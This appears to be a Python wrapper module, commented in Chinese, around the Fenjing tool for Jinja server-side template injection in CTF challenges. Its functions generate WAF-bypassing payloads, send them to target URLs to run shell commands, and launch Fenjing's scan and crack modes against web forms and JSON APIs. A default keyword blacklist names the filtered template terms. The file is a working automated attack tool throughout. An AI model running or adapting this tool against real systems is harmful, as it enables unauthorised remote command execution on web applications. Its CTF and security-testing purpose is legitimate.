"""
Fenjing SSTI自动攻击工具封装
==============================
适用于CTF中Jinja SSTI漏洞的自动绕过WAF攻击

功能:
- 自动生成绕过WAF的payload
- 支持指定WAF检测函数
- 支持交互式命令执行
"""

import json
import logging
import subprocess
import requests
from typing import Callable, Optional, Tuple, Dict, Any
from pathlib import Path

from toolkit.base import get_venv_python, run_subprocess

# 添加fenjing源码路径
FENJING_PATH = Path(__file__).parent.parent / "tools_source" / "Fenjing"

if str(FENJING_PATH) not in __import__('sys').path:
    __import__('sys').path.insert(0, str(FENJING_PATH))

try:
    from fenjing import exec_cmd_payload, config_payload
    from fenjing.full_payload_gen import FullPayloadGen
    from fenjing import const
    FENJING_AVAILABLE = True
except ImportError as e:
    FENJING_AVAILABLE = False
    print(f"[Error] Fenjing import failed: {e}")


def get_waf_checker(blacklist: Optional[list] = None) -> Callable[[str], bool]:
    """
    获取WAF检测函数

    默认黑名单包括常见被过滤的关键字:
    - config, self, g, os, class, length, mro, base, lipsum
    - 引号、下划线、括号等特殊字符
    - 数字0-9（全角和半角）

    Args:
        blacklist: 自定义黑名单列表，如果为None则使用默认

    Returns:
        WAF检测函数，返回True表示payload可以通过WAF
    """
    if blacklist is None:
        blacklist = [
            "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
            "[", '"', "'", "_", ".", "+", "~", "{{",
            "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
            "０","１","２","３","４","５","６","７","８","９"
        ]

    def waf(s: str) -> bool:
        return all(word not in s for word in blacklist)

    return waf


def dynamic_waf_checker(
    url: str,
    payload_param: str = "name",
    method: str = "GET",
    waf_keyword: str = "BAD",
    extra_params: Optional[Dict] = None,
    extra_data: Optional[Dict] = None,
    headers: Optional[Dict] = None,
    cookies: Optional[Dict] = None,
    timeout: int = 10,
    delay: float = 0.02
) -> Callable[[str], bool]:
    """
    动态WAF检测函数 - 通过实际提交payload来检测是否被WAF

    Args:
        url: 目标URL
        payload_param: 提交payload的参数名
        method: HTTP方法，GET或POST
        waf_keyword: WAF页面包含的关键字，用于判断payload是否被WAF
        extra_params: 额外的GET参数
        extra_data: 额外的POST参数
        headers: 自定义请求头
        cookies: 自定义Cookie
        timeout: 请求超时
        delay: 请求间隔(防止发送过多请求)

    Returns:
        WAF检测函数
    """
    import functools
    import time

    @functools.lru_cache(1000)
    def waf(payload: str) -> bool:
        time.sleep(delay)

        try:
            if method.upper() == "GET":
                params = {payload_param: payload}
                if extra_params:
                    params.update(extra_params)
                resp = requests.get(
                    url, params=params, headers=headers,
                    cookies=cookies, timeout=timeout
                )
            else:
                data = {payload_param: payload}
                if extra_data:
                    data.update(extra_data)
                resp = requests.post(
                    url, data=data, headers=headers,
                    cookies=cookies, timeout=timeout
                )

            return waf_keyword not in resp.text
        except:
            return False

    return waf


def generate_payload(
    command: str = "id",
    blacklist: Optional[list] = None,
    waf_func: Optional[Callable[[str], bool]] = None,
    config: bool = False
) -> Tuple[str, bool]:
    """
    生成绕过WAF的payload

    Args:
        command: 要执行的命令
        blacklist: 黑名单列表(如果指定waf_func则不需要)
        waf_func: 自定义WAF检测函数
        config: 是否生成config对象读取payload

    Returns:
        (payload字符串, 是否会产生回显)
    """
    if not FENJING_AVAILABLE:
        return "[Error] Fenjing not available", False

    # 设置日志级别
    logging.basicConfig(level=logging.WARNING)

    # 使用默认WAF或自定义WAF
    waf = waf_func if waf_func else get_waf_checker(blacklist)

    if config:
        payload, will_print = config_payload(waf)
        return payload, will_print

    # 生成命令执行payload
    payload, will_print = exec_cmd_payload(waf, command)
    return payload, will_print


def generate_eval_payload(
    expression: str,
    blacklist: Optional[list] = None,
    waf_func: Optional[Callable[[str], bool]] = None,
) -> Tuple[str, bool]:
    """
    生成eval表达式payload（用于获取flag变量等）

    Args:
        expression: 要eval的表达式，如 "__import__('__main__').flag"
        blacklist: 黑名单列表
        waf_func: 自定义WAF检测函数

    Returns:
        (payload字符串, 是否会产生回显)
    """
    if not FENJING_AVAILABLE:
        return "[Error] Fenjing not available", False

    from fenjing.full_payload_gen import FullPayloadGen

    waf = waf_func if waf_func else get_waf_checker(blacklist)

    payload_gen = FullPayloadGen(waf)
    payload, will_print = payload_gen.generate(
        const.EVAL,
        (const.STRING, expression)
    )

    return payload, will_print


def run_command(url: str, command: str = "id", **kwargs) -> Dict[str, Any]:
    """
    自动生成payload并发送到目标URL执行命令

    Args:
        url: 目标URL
        command: 要执行的命令
        **kwargs: 传递给dynamic_waf_checker的参数

    Returns:
        包含success, payload, response, error的字典
    """
    if not FENJING_AVAILABLE:
        return {"success": False, "error": "Fenjing not available"}

    # 生成payload - 优先使用动态WAF检测，如果没有则使用默认黑名单
    if 'waf_keyword' in kwargs:
        waf_func = dynamic_waf_checker(url, **kwargs)
    else:
        waf_func = get_waf_checker(kwargs.get('blacklist'))

    payload, will_print = generate_payload(command, waf_func=waf_func)

    method = kwargs.get('method', 'GET')
    payload_param = kwargs.get('payload_param', 'name')
    extra_params = kwargs.get('extra_params', {})
    extra_data = kwargs.get('extra_data', {})
    headers = kwargs.get('headers', {})
    cookies = kwargs.get('cookies', {})
    timeout = kwargs.get('timeout', 10)

    try:
        if method.upper() == 'GET':
            params = {payload_param: payload}
            params.update(extra_params)
            resp = requests.get(url, params=params, headers=headers,
                              cookies=cookies, timeout=timeout)
        else:
            data = {payload_param: payload}
            data.update(extra_data)
            resp = requests.post(url, data=data, headers=headers,
                               cookies=cookies, timeout=timeout)

        return {
            "success": True,
            "payload": payload,
            "will_print": will_print,
            "response": resp.text,
            "status_code": resp.status_code
        }

    except Exception as e:
        return {
            "success": False,
            "payload": payload,
            "will_print": will_print,
            "error": str(e)
        }


def _run_fenjing_cli(cmd_parts: list[str], timeout: int) -> subprocess.CompletedProcess:
    """使用统一 runtime 执行 fenjing CLI。"""
    return run_subprocess(
        [get_venv_python(), "-m", "fenjing", *cmd_parts],
        timeout=timeout,
        cwd=FENJING_PATH,
    )


def scan_forms(
    url: str,
    timeout: int = 300,
    detect_mode: str = "fast",
    environment: str = "flask"
) -> Dict[str, Any]:
    """
    扫描目标网站的所有表单

    Args:
        url: 目标URL
        timeout: 扫描超时时间
        detect_mode: fast或accurate
        environment: flask或jinja

    Returns:
        扫描结果
    """
    if not FENJING_AVAILABLE:
        return {"success": False, "error": "Fenjing not available"}

    cmd_parts = [
        "scan",
        "--url", url,
        "--detect-mode", detect_mode,
        "--environment", environment,
        "--timeout", str(timeout),
        "--exec-cmd", "id"
    ]

    try:
        result = _run_fenjing_cli(cmd_parts, timeout=timeout + 60)
        return {
            "success": result.returncode == 0,
            "output": result.stdout,
            "error": result.stderr,
            "returncode": result.returncode
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "扫描超时", "output": ""}
    except Exception as e:
        return {"success": False, "error": str(e), "output": ""}


def crack_specific_form(
    url: str,
    method: str = "GET",
    inputs: str = "name",
    command: str = "id",
    **kwargs
) -> Dict[str, Any]:
    """
    攻击指定的表单

    Args:
        url: 目标URL
        method: HTTP方法，GET或POST
        inputs: 要攻击的字段名，多个用逗号分隔
        command: 要执行的命令
        **kwargs: 其他参数(detect_mode, environment等)

    Returns:
        攻击结果
    """
    if not FENJING_AVAILABLE:
        return {"success": False, "error": "Fenjing not available"}

    cmd_parts = [
        "crack",
        "--url", url,
        "--method", method,
        "--inputs", inputs,
        "--exec-cmd", command,
        "--detect-mode", kwargs.get('detect_mode', 'fast'),
        "--environment", kwargs.get('environment', 'flask')
    ]

    if 'interval' in kwargs:
        cmd_parts.extend(["--interval", str(kwargs['interval'])])

    if 'user_agent' in kwargs:
        cmd_parts.extend(["--user-agent", kwargs['user_agent']])

    if 'header' in kwargs:
        for header in kwargs['header']:
            cmd_parts.extend(["--header", header])

    if 'cookie' in kwargs:
        cmd_parts.extend(["--cookie", kwargs['cookie']])

    if 'proxy' in kwargs:
        cmd_parts.extend(["--proxy", kwargs['proxy']])

    try:
        result = _run_fenjing_cli(cmd_parts, timeout=kwargs.get('timeout', 300) + 60)
        return {
            "success": result.returncode == 0,
            "output": result.stdout,
            "error": result.stderr,
            "returncode": result.returncode,
            "command": " ".join(cmd_parts)
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "攻击超时", "output": ""}
    except Exception as e:
        return {"success": False, "error": str(e), "output": ""}


def crack_json_api(
    url: str,
    json_data: Dict[str, Any],
    key: str,
    command: str = "id",
    **kwargs
) -> Dict[str, Any]:
    """
    攻击JSON API

    Args:
        url: JSON API地址
        json_data: JSON数据字典
        key: 要攻击的键名
        command: 要执行的命令
        **kwargs: 其他参数

    Returns:
        攻击结果
    """
    cmd_parts = [
        "crack-json",
        "--url", url,
        "--json-data", json.dumps(json_data),
        "--key", key,
        "--exec-cmd", command,
        "--detect-mode", kwargs.get('detect_mode', 'fast')
    ]

    try:
        result = _run_fenjing_cli(cmd_parts, timeout=kwargs.get('timeout', 300) + 60)
        return {
            "success": result.returncode == 0,
            "output": result.stdout,
            "error": result.stderr,
            "returncode": result.returncode
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "攻击超时", "output": ""}
    except Exception as e:
        return {"success": False, "error": str(e), "output": ""}


def get_fenjing_status() -> Dict[str, Any]:
    """获取fenjing状态信息"""
    return {
        "available": FENJING_AVAILABLE,
        "path": str(FENJING_PATH),
        "exists": FENJING_PATH.exists()
    }


if __name__ == "__main__":
    # 测试
    print(get_fenjing_status())
